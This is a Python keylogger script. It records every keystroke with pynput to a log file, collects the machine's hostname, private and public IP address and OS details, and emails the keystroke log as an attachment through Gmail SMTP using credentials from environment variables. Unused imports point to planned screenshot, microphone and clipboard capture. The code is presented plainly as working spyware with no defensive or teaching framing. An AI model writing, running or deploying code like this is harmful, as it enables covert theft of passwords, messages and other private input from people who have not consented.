# Libraries
import os
from dotenv import load_dotenv

import osascript

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

#import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

load_dotenv()

keys_information = 'key_log.txt'
system_information = 'systeminfo.txt'
email_address = os.getenv('EMAIL_ADDRESS')
password = os.getenv('PASSWORD')
toaddr = os.getenv('EMAIL_ADDRESS')

file_path = os.getenv('FILE_PATH')
extend = '/'

def send_mail(filename, attachment, toaddr):
    
    fromaddr = email_address
    
    msg = MIMEMultipart()
    
    msg['From'] = fromaddr
    
    msg['To'] = toaddr
    
    msg['Subject'] = 'Log File'
    
    body = "hello baudi"
    
    msg.attach(MIMEText(body, 'plain'))
    
    filename = filename
    attachment = open(attachment, 'rb')
    
    p = MIMEBase('application', 'octet-stream')
    
    p.set_payload((attachment).read())
    
    encoders.encode_base64(p)
    
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    
    msg.attach(p)
    
    s = smtplib.SMTP('smtp.gmail.com', 587)
    
    s.starttls()
    
    s.login(fromaddr, password)
    
    text = msg.as_string()
    
    s.sendmail(fromaddr, toaddr, text)
    
    s.quit()
    
def device_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://icanhazip.com").text
            f.write('Public IP Address: ' + public_ip)
        
        except Exception:
            f.write("Couldn't get Public IP Address")
            
        f.write('Processor: ' + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + IPAddr + "\n")
        
    
count = 0
keys = []

def on_press(key):
    global keys, count

    print(key)
    keys.append(key)
    count += 1
    
    if count >= 1:
        count=0
        write_file(keys)
        keys = [] 


def write_file(keys):
    with open(file_path + extend + keys_information, 'a') as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find('space') > 0:
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()


def on_release(key):
    if key == Key.esc:
        send_mail(keys_information, file_path + extend + keys_information, toaddr)
        device_information()
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()